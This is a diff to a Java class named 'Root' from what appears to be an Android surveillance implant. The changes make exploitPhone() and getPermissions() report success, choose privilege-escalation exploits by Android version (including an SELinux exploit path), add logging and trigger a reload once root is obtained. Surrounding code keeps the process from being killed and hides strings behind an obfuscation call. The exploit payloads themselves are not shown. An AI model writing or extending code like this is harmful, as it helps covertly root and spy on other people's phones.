@@ -87,14 +87,18 @@ public class Root {
 		return ret;
 	}
 
-	static public void exploitPhone() {
+	static public boolean exploitPhone() {
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (exploitPhone) OS: " + android.os.Build.VERSION.SDK_INT);
+		}
 		method = M.e("previous");
 		if (PackageInfo.checkRoot()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): root shell already installed, no need to exploit again");
 			}
 
-			return;
+			return false;
 		}
 
 		startExploiting = new Date();
@@ -103,7 +107,7 @@ public class Root {
 				Check.log(TAG + "(exploitPhone): Android <= 2.1, version too old");
 			}
 			method = M.e("old");
-			return;
+			return false;
 		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
 				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO -
 																// HONEYCOMB_MR2
@@ -146,6 +150,11 @@ public class Root {
 					}
 					method = M.e("selinux");
 					selinuxExploit();
+					return true;
+				}else{
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (exploitPhone): SELinux Device is NOT locally exploitable"); //$NON-NLS-1$
+					}
 				}
 			}
 		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
@@ -159,13 +168,20 @@ public class Root {
 				}
 				method = M.e("selinux");
 				selinuxExploit();
+				return true;
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (exploitPhone): SELinux Device is NOT locally exploitable"); //$NON-NLS-1$
+				}
 			}
 		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
 			// Nada
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(exploitPhone): Android >= 4.4 detected, nope nope");
+				Check.log(TAG + "(exploitPhone): Android >= 4.4 detected, no exploit");
 			}
 		}
+		return false;
+		
 	}
 
 	static public void adjustOom() {
@@ -417,7 +433,7 @@ public class Root {
 			return false;
 		}
 
-		if ((android.os.Build.VERSION.SDK_INT < 14 || android.os.Build.VERSION.SDK_INT > 17)) {
+		if ((android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.FROYO || android.os.Build.VERSION.SDK_INT > 17)) {
 			return false;
 		}
 		// preprocess/expl_check
@@ -634,7 +650,7 @@ public class Root {
 		}
 	}
 
-	static synchronized public void getPermissions() {
+	static synchronized public boolean getPermissions() {
 		// Abbiamo su?
 		Status.setSu(PackageInfo.hasSu());
 
@@ -692,6 +708,8 @@ public class Root {
 
 		// Avoid having the process killed for using too many resources
 		Root.adjustOom();
+		
+		return PackageInfo.checkRoot();
 	}
 
 	static public boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
@@ -1049,6 +1067,9 @@ public class Root {
 					}
 
 					Root.removeScript("fig");
+					if(getPermissions()){
+						Status.self().setReload();
+					}
 				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " ERROR: (run), cannot create script");
